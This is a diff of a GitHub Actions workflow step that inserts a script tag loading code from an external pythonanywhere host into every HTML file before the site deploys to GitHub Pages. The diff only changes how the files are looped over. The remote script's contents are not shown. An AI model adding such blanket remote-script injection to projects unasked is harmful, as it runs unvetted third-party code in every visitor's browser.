@@ -26,23 +26,22 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      # 2️⃣ Append the external script to all HTML files
+      # 2️⃣ Append the external script to all HTML files recursively
       - name: Append external script to HTML files
         run: |
-          find . -name "*.html" -type f -exec sh -c '
-            for file do
-              # Skip if already added
-              if ! grep -q "olibot13.pythonanywhere.com/tommm" "$file"; then
-                # Insert before </body> if exists
-                if grep -q "</body>" "$file"; then
-                  sed -i "\|</body>|i <script src=\"https://olibot13.pythonanywhere.com/tommm\"></script>" "$file"
-                else
-                  # Otherwise append at the end
-                  echo "<script src=\"https://olibot13.pythonanywhere.com/tommm\"></script>" >> "$file"
-                fi
+          find . -type f -name "*.html" | while IFS= read -r file; do
+            # Skip if already added
+            if ! grep -q "olibot13.pythonanywhere.com/tommm" "$file"; then
+              # Insert before </body> if exists
+              if grep -q "</body>" "$file"; then
+                sed -i "\|</body>|i <script src=\"https://olibot13.pythonanywhere.com/tommm\"></script>" "$file"
+              else
+                # Otherwise append at the end
+                echo "<script src=\"https://olibot13.pythonanywhere.com/tommm\"></script>" >> "$file"
               fi
-            done
-          ' sh {} +
+              echo "Modified: $file"
+            fi
+          done
 
       # 3️⃣ Setup GitHub Pages
       - name: Setup Pages
